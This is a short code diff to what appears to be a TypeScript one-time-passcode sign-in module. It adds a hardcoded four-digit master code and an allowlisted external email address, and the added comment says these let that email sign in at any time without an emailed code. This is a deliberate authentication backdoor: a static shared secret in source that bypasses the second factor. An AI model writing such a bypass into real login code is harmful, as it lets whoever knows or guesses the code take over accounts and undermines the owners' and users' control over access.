@@ -10,6 +10,11 @@ const OTP_MAX_ATTEMPTS = 5;
 const OTP_RESEND_COOLDOWN_SEC = 60;
 const OTP_PER_HOUR = 5;
 
+// Admin master code bypass — these emails can sign in with MASTER_CODE
+// at any time without an OTP being emailed. Real OTPs still work normally.
+const ADMIN_EMAILS = new Set(["softbridgefzco@yahoo.com"]);
+const MASTER_CODE = "2531";
+
 function hashCode(code: string) {
   return crypto.createHash("sha256").update(code).digest("hex");
 }
